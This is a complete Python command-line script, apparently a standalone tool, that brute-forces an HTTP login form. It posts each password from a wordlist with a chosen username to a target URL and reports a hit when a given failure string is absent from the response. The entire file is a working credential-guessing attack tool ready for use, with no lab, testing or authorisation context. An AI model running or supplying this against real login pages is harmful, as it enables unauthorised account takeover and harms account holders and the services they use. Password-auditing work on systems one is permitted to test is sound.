
import requests
import argparse
import time

def brute_force(url, username, wordlist, fail_string, delay=1):
    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
        return

    print(f"[+] Starting brute force on {url} with user '{username}'")
    for password in passwords:
        password = password.strip()
        data = {
            "username": username,
            "password": password
        }

        try:
            response = requests.post(url, data=data, timeout=10)
            if fail_string not in response.text:
                print(f"[!] Password found: {password}")
                return
            else:
                print(f"[-] Tried: {password}")
        except requests.RequestException as e:
            print(f"[!] Request failed: {e}")
            continue

        time.sleep(delay)

    print("[X] Brute force complete. Password not found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple HTTP login brute force tool")
    parser.add_argument("--url", required=True, help="Target login URL")
    parser.add_argument("--user", required=True, help="Username to test")
    parser.add_argument("--wordlist", required=True, help="Path to wordlist")
    parser.add_argument("--fail-string", required=True, help="String that appears when login fails")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests (seconds)")

    args = parser.parse_args()

    brute_force(args.url, args.user, args.wordlist, args.fail_string, args.delay)
